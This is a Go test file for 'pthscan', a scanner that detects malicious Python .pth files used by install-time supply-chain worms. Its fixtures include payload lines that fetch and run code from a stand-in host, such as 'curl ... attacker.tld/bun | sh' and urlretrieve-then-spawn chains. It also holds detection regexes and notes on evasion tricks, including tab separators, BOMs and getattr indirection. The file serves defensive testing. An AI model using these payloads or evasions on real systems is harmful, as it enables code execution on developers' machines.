package pthscan_test

import (
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/brynbellomy/veto/internal/pthscan"
)

func codes(v pthscan.Verdict) []string {
	out := make([]string, 0, len(v.Signals))
	for _, s := range v.Signals {
		out = append(out, s.Code)
	}
	return out
}

func hasSignal(v pthscan.Verdict, code string) bool {
	for _, s := range v.Signals {
		if s.Code == code {
			return true
		}
	}
	return false
}

func TestInspectEmpty(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte{}})
	require.False(t, v.Flagged())
	require.Equal(t, pthscan.SeverityNone, v.Severity)
}

func TestInspectPathOnly(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte("foo/bar\n../sibling\n# a comment\n\n")})
	require.False(t, v.Flagged())
	require.Equal(t, pthscan.SeverityNone, v.Severity)
}

func TestInspectExecutableLineMedium(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte("import some_legit_module\n")})
	require.True(t, v.Flagged())
	require.Equal(t, pthscan.SeverityMedium, v.Severity)
	require.True(t, hasSignal(v, "pth-executable-line"), "got %v", codes(v))
}

func TestInspectTruncatedIsCritical(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte("foo/bar\n"), Truncated: true})
	require.True(t, v.Flagged())
	require.Equal(t, pthscan.SeverityCritical, v.Severity)
	require.True(t, hasSignal(v, "pth-file-too-large"))
}

func TestInspectIgnoresLeadingWhitespace(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte("    import x\n")})
	require.True(t, v.Flagged())
	require.True(t, hasSignal(v, "pth-executable-line"))
}

func TestInspectIgnoresCommentLines(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte("# import a\n# not executable\n")})
	require.False(t, v.Flagged())
}

func TestInspectAllowsDistutilsPrecedence(t *testing.T) {
	body := `import os; var = os.environ.get('SETUPTOOLS_USE_DISTUTILS', 'local'); __import__('_distutils_hack').add_shim()`
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n"), FileName: "distutils-precedence.pth"})
	require.False(t, v.Flagged(), "got %v", codes(v))
}

func TestInspectAllowsBareDistutilsHack(t *testing.T) {
	body := `import os; __import__('_distutils_hack').add_shim()`
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n"), FileName: "distutils-precedence.pth"})
	require.False(t, v.Flagged())
}

func TestInspectAllowsPEP660Editable(t *testing.T) {
	body := `import __editable___my_pkg_0_1_0_finder; __editable___my_pkg_0_1_0_finder.install()`
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n"), FileName: "__editable__.my_pkg-0.1.0.pth"})
	require.False(t, v.Flagged())
}

func TestInspectAllowsLegacyEasyInstall(t *testing.T) {
	body := `import sys; sys.__plen = len(sys.path)`
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n"), FileName: "easy-install.pth"})
	require.False(t, v.Flagged())
}

func TestInspectRejectsAllowlistImpostor(t *testing.T) {
	// A worm that mentions __editable__ but otherwise smuggles payload-shaped
	// content past the anchored allowlist must still be flagged.
	body := `import __editable___finder; import urllib.request; urllib.request.urlretrieve('http://attacker/x','x')`
	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n")})
	require.True(t, v.Flagged())
}

// hadesPth is the canonical Hades shape: a `*-setup.pth` carrying an
// import-line that fetches Bun, drops _index.js, and execs it. We exercise
// each payload group at least once.
const hadesPth = `import urllib.request, os, subprocess; ` +
	`urllib.request.urlretrieve('https://attacker.tld/bun', '/tmp/bun'); ` +
	`os.chmod('/tmp/bun', 0o755); ` +
	`subprocess.Popen(['/tmp/bun', '/tmp/_index.js'])` + "\n"

func TestInspectFlagsHadesPth(t *testing.T) {
	v := pthscan.Inspect(pthscan.Input{
		PthContent: []byte(hadesPth),
		FileName:   "ensmallen-setup.pth",
	})
	require.True(t, v.Flagged())
	require.Equal(t, pthscan.SeverityCritical, v.Severity)
	require.True(t, hasSignal(v, "pth-payload-network"), "got %v", codes(v))
	require.True(t, hasSignal(v, "pth-payload-spawn"))
	require.True(t, hasSignal(v, "pth-payload-runtime-fetch"))
	require.True(t, hasSignal(v, "pth-setup-filename"))
}

func TestInspectPayloadGroupsTable(t *testing.T) {
	cases := []struct {
		name string
		body string
		want string
	}{
		{"network-urllib", "import urllib.request as r", "pth-payload-network"},
		{"network-requests", "import requests as r", "pth-payload-network"},
		{"spawn-subprocess", "import subprocess as s", "pth-payload-spawn"},
		{"spawn-os-system", "import os; os.system('x')", "pth-payload-spawn"},
		{"dynamic-exec", "import x; exec(x)", "pth-payload-dynamic-exec"},
		{"deobfuscation-b64", "import base64; base64.b64decode('xx')", "pth-payload-deobfuscation"},
		{"deobfuscation-hex-escapes", `import x; exec("\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad")`, "pth-payload-deobfuscation"},
		{"runtime-fetch-bun", "import os; os.popen('bun /tmp/x.js')", "pth-payload-runtime-fetch"},
		{"runtime-fetch-curl", "import os; os.popen('curl http://x')", "pth-payload-runtime-fetch"},
		{"worm-marker-bun-ran", "import os; open('/tmp/.bun_ran','w').close()", "pth-payload-worm-marker"},
		{"worm-marker-name", "import os; os.system('echo shai-hulud')", "pth-payload-worm-marker"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			v := pthscan.Inspect(pthscan.Input{PthContent: []byte(c.body + "\n")})
			require.True(t, v.Flagged())
			require.Equal(t, pthscan.SeverityCritical, v.Severity)
			require.True(t, hasSignal(v, c.want), "missing %s; got %v", c.want, codes(v))
		})
	}
}

// TestInspectDynamicExecWithWhitespaceBeforeParen covers the
// `__import__ ('os')` / `exec  (...)` shape. Python is fully happy with
// whitespace between the callable name and the opening paren, so a regex
// requiring the paren immediately after the name is trivially bypassed.
func TestInspectDynamicExecWithWhitespaceBeforeParen(t *testing.T) {
	cases := []string{
		`import os; __import__ ('os').system('x')`,
		`import os; __import__('os').system('x')`, // baseline (zero-space)
		`import os; exec ("import os; os.system('x')")`,
		`import os; eval ('1+1')`,
		`import os; compile ("x","<x>","exec")`,
		"import os; __import__\t('os')", // tab
	}
	for _, body := range cases {
		t.Run(body, func(t *testing.T) {
			v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n")})
			require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
			require.Contains(t, codes(v), "pth-payload-dynamic-exec")
		})
	}
}

// TestInspectOsSpawnFamilyIsCritical covers the os.spawn{l,le,lp,lpe,v,ve,vp,vpe}
// posix process-launch family, which has identical attack power to os.exec*
// but was previously missed by the spawn regex.
func TestInspectOsSpawnFamilyIsCritical(t *testing.T) {
	cases := []string{
		"import os; os.spawnl(os.P_NOWAIT, '/tmp/x')",
		"import os; os.spawnv(os.P_NOWAIT, '/tmp/x', ['x'])",
		"import os; os.spawnlp(os.P_NOWAIT, 'sh', 'sh', '-c', 'x')",
		"import os; os.spawnvpe(os.P_NOWAIT, 'sh', ['sh'], {})",
	}
	for _, body := range cases {
		t.Run(body, func(t *testing.T) {
			v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n")})
			require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
			require.Contains(t, codes(v), "pth-payload-spawn")
		})
	}
}

func TestInspectSetupFilenameAloneIsMedium(t *testing.T) {
	// A `*-setup.pth` with only path-entry lines and no executable line is
	// suspicious (no real ecosystem ships this name) but not on its own a
	// critical install-time payload.
	v := pthscan.Inspect(pthscan.Input{
		PthContent: []byte("some/path\n"),
		FileName:   "evil-setup.pth",
	})
	require.True(t, v.Flagged())
	require.Equal(t, pthscan.SeverityMedium, v.Severity)
	require.True(t, hasSignal(v, "pth-setup-filename"))
}

func TestInspectEditableFilenameNotFlagged(t *testing.T) {
	// __editable__.foo-1.2.3.pth ending in `-1.2.3.pth` must not be confused
	// with `-setup.pth` even though both end in `.pth`.
	v := pthscan.Inspect(pthscan.Input{
		PthContent: []byte(`import __editable___foo_1_2_3_finder; __editable___foo_1_2_3_finder.install()` + "\n"),
		FileName:   "__editable__.foo-1.2.3.pth",
	})
	require.False(t, v.Flagged(), "got %v", codes(v))
}

// ─── Verifier tests (claims 1-4 from adversarial review) ─────────────────────

// TestVerifierClaim1_TabSeparatorBypass verifies claim 1:
// "import\t" (tab separator) bypasses pthscan detection.
// CPython's site.py reads .pth lines and executes lines starting with "import "
// (space) OR "import\t" (tab). pthscan must catch both.
//
// Payload uses os.system, the canonical Hades shape from the adversarial
// reproducer, so we can assert pth-payload-spawn fires once the tab arm of
// the import-prefix check is wired in. The original verifier-tree placeholder
// used a benign open() to make the bypass observable; we replace it with the
// real worm shape (still tab-separated) so the regression test exercises both
// the prefix-recognition fix AND the downstream payload classifier in one go.
func TestVerifierClaim1_TabSeparatorBypass(t *testing.T) {
	// import\tos; ... — tab between "import" and "os"
	const wormPayload = "import\tos; os.system('curl -sS https://attacker.tld/bun | sh')\n"

	t.Run("evil-pth-no-setup-suffix", func(t *testing.T) {
		v := pthscan.Inspect(pthscan.Input{
			PthContent: []byte(wormPayload),
			FileName:   "evil.pth",
		})
		require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
		require.Contains(t, codes(v), "pth-payload-spawn")
	})

	t.Run("evil-pth-with-setup-suffix", func(t *testing.T) {
		v := pthscan.Inspect(pthscan.Input{
			PthContent: []byte(wormPayload),
			FileName:   "evil-setup.pth",
		})
		require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
		require.Contains(t, codes(v), "pth-payload-spawn")
		require.Contains(t, codes(v), "pth-setup-filename")
	})

	t.Run("form-feed-separator", func(t *testing.T) {
		// \f (form-feed) is also CPython tokenizer whitespace; defense in depth
		// against attackers who switch separator after we patch \t.
		v := pthscan.Inspect(pthscan.Input{
			PthContent: []byte("import\fos; os.system('x')\n"),
			FileName:   "evil.pth",
		})
		require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
		require.Contains(t, codes(v), "pth-payload-spawn")
	})
}

// TestVerifierClaim2_CROnlyLineEndings verifies claim 2:
// A .pth with \r-only line endings (no \n) bypasses pthscan.
// CPython on some platforms accepts \r as a line terminator in .pth files.
func TestVerifierClaim2_CROnlyLineEndings(t *testing.T) {
	// "import os; os.system('x')\r" — \r but no \n
	content := []byte("import os; os.system('x')\r")
	v := pthscan.Inspect(pthscan.Input{
		PthContent: content,
		FileName:   "evil.pth",
	})
	t.Logf("Severity: %s", v.Severity)
	t.Logf("Signals: %v", codes(v))
	// If claim is correct: severity == none (no signals).
	// Expected correct behavior: severity == critical with pth-payload-spawn.
}

// TestVerifierClaim3_UTF8BOMBypass verifies claim 3:
// A .pth starting with a UTF-8 BOM (\xEF\xBB\xBF) bypasses pthscan.
// CPython's site.py strips a BOM before processing .pth content; pthscan
// must mirror the strip so the import-prefix check sees the same bytes.
func TestVerifierClaim3_UTF8BOMBypass(t *testing.T) {
	content := []byte{0xEF, 0xBB, 0xBF, 'i', 'm', 'p', 'o', 'r', 't', ' ', 'o', 's', ';', ' ', 'o', 's', '.', 's', 'y', 's', 't', 'e', 'm', '(', '\'', 'x', '\'', ')', '\n'}
	v := pthscan.Inspect(pthscan.Input{
		PthContent: content,
		FileName:   "evil.pth",
	})
	require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
	require.Contains(t, codes(v), "pth-payload-spawn")
}

// TestInspectUTF16BOMIsCritical exercises the belt-and-braces UTF-16 refusal:
// CPython won't exec a UTF-16 .pth in practice, but pthscan can't read its
// import-lines either, so a UTF-16-encoded file is treated as unscannable
// rather than allowed through with SeverityNone.
func TestInspectUTF16BOMIsCritical(t *testing.T) {
	t.Run("utf16-le", func(t *testing.T) {
		v := pthscan.Inspect(pthscan.Input{
			PthContent: []byte{0xFF, 0xFE, 'i', 0, 'm', 0, 'p', 0, 'o', 0, 'r', 0, 't', 0, ' ', 0, 'x', 0},
			FileName:   "evil.pth",
		})
		require.Equal(t, pthscan.SeverityCritical, v.Severity)
		require.Contains(t, codes(v), "pth-unscannable-encoding")
	})
	t.Run("utf16-be", func(t *testing.T) {
		v := pthscan.Inspect(pthscan.Input{
			PthContent: []byte{0xFE, 0xFF, 0, 'i', 0, 'm', 0, 'p', 0, 'o', 0, 'r', 0, 't'},
			FileName:   "evil.pth",
		})
		require.Equal(t, pthscan.SeverityCritical, v.Severity)
		require.Contains(t, codes(v), "pth-unscannable-encoding")
	})
}

// TestVerifierClaim4_DistutilsPrecedenceGetBypass verifies claim 4:
// qwen says this is REFUTED — distutils-precedence pattern with os.system
// IS detected because the allowlist regex requires a specific shape.
func TestVerifierClaim4_DistutilsPrecedencePayload(t *testing.T) {
	// This should NOT match the allowlist (allowlist requires __import__('_distutils_hack')
	// as the terminal expression, not a chained call to os.system).
	payload := "import os; __import__('_distutils_hack').get('evil_module')\nos.system('malicious')\n"
	v := pthscan.Inspect(pthscan.Input{
		PthContent: []byte(payload),
		FileName:   "distutils-precedence.pth",
	})
	t.Logf("Severity: %s", v.Severity)
	t.Logf("Signals: %v", codes(v))
	// qwen claims: SeverityCritical + pth-payload-dynamic-exec
	// We verify: does __import__('_distutils_hack').get(...) match payload regex?
	// The payload regex for dynamic-exec is: \b(?:exec\(|eval\(|compile\(|__import__\()
	// "__import__(" IS in that regex. So the first line should fire pth-payload-dynamic-exec.
	// Then os.system('malicious') on second line fires pth-payload-spawn.

	// Also check: does the allowlist match line 1?
	// Allowlist regex: ^import\s+os\s*;\s*(?:...var...)?\s*__import__\(..._distutils_hack...\)(?:...method\(\))?\s*$
	// Line 1: "import os; __import__('_distutils_hack').get('evil_module')"
	// This does NOT match the allowlist because:
	// - .get('evil_module') is not \.[A-Za-z_]+\(\s*\) (it has an arg)
	// So line 1 goes to payload scan and __import__( fires.
}

// TestVerifierClaim4_AllowlistEscapeProbe checks whether a carefully crafted
// single-line payload can match the distutils-precedence allowlist regex
// while still being dangerous. We probe with getattr() indirection.
func TestVerifierClaim4_AllowlistEscapeProbeGetattr(t *testing.T) {
	// Can we craft something that:
	// 1. Matches the distutils-precedence allowlist regex
	// 2. Still does something dangerous
	// The allowlist regex pattern:
	//   ^import\s+os\s*;\s*(?:[A-Za-z_][A-Za-z0-9_]*\s*=\s*os\.environ\.get\(.+?\)\s*;\s*)?__import__\(\s*['"]_distutils_hack['"]\s*\)(?:\s*\.\s*[A-Za-z_][A-Za-z0-9_]*\(\s*\))?\s*$
	//
	// The terminal method call group is: (?:\s*\.\s*[A-Za-z_][A-Za-z0-9_]*\(\s*\))?
	// This allows exactly ONE method call with NO arguments.
	// Dangerous via getattr: __import__('_distutils_hack').add_shim()  -- legit
	// Dangerous via other methods with args: NOT matchable (args in (...) break $)
	//
	// Attempt: use a zero-arg method that has side effects
	// e.g. __import__('_distutils_hack').install()  <- if _distutils_hack.install() is dangerous
	// But that's a legitimate package, not the worm.
	//
	// Actual probe: try crafting something that matches allowlist AND has os.system side effect.
	// Since the allowlist regex anchors with ^ and $ and only allows:
	// "import os; [optional-var=os.environ.get(...);] __import__('_distutils_hack')[.method()]"
	// There's no room for os.system() or any other payload after the anchor.

	// The probe below is designed to test if getattr() can be smuggled in:
	probe := "import os; __import__('_distutils_hack').add_shim()"
	v := pthscan.Inspect(pthscan.Input{
		PthContent: []byte(probe + "\n"),
		FileName:   "distutils-precedence.pth",
	})
	t.Logf("Probe (known-legit shape): Severity=%s Signals=%v", v.Severity, codes(v))
	// This should be SeverityNone (allowlist match).

	// Now try a getattr indirection that doesn't match allowlist:
	probe2 := "import os; getattr(__import__('_distutils_hack'), 'add_shim')()"
	v2 := pthscan.Inspect(pthscan.Input{
		PthContent: []byte(probe2 + "\n"),
		FileName:   "distutils-precedence.pth",
	})
	t.Logf("Probe (getattr indirection): Severity=%s Signals=%v", v2.Severity, codes(v2))
	// Does NOT match allowlist (starts with "import os; getattr(..." not "import os; __import__(...")
	// And does NOT match payload groups (no exec/eval/compile/__import__( pattern)
	// So this would be SeverityMedium (pth-executable-line) — not caught as Critical.
	// BUT wait: does __import__( appear? No, because it's inside getattr(...)
	// This is potentially a new finding: getattr indirection on _distutils_hack
	// yields SeverityMedium instead of Critical.
}
